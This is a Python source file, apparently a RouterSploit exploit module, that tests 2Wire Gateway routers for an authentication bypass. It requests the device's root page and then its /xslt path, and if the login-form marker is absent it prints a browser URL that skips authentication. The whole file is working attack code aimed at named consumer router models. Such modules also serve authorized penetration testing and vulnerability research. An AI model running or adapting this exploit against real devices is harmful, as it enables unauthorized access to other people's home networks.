from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for 2Wire Gateway devices Authentication Bypass vulnerability.
    If the target is vulnerable link to bypass authentication is provided"
    """
    __info__ = {
        'name': '2Wire Gateway Auth Bypass',
        'description': 'Module exploits 2Wire Gateway authentication bypass vulnerability. '
                       'If the target is vulnerable link to bypass authentication is provided.',
        'authors': [
            'bugz',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/9459/',
        ],
        'devices': [
            '2Wire 2701HGV-W',
            '2Wire 3800HGV-B',
            '2Wire 3801HGV',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_info("\nUse your browser:")
            print_info("{}:{}/xslt".format(self.target, self.port))
        else:
            print_error("Target seems to be not vulnerable")

    @mute
    def check(self):
        mark = '<form name="pagepost" method="post" action="/xslt?PAGE=WRA01_POST&amp;NEXTPAGE=WRA01_POST" id="pagepost">'

        # checking if the target is valid
        url = "{}:{}/".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if mark not in response.text:
            return False  # target is not vulnerable

        # checking if authentication can be bypassed
        url = "{}:{}/xslt".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if mark not in response.text:
            return True  # target vulnerable

        return False  # target not vulnerable
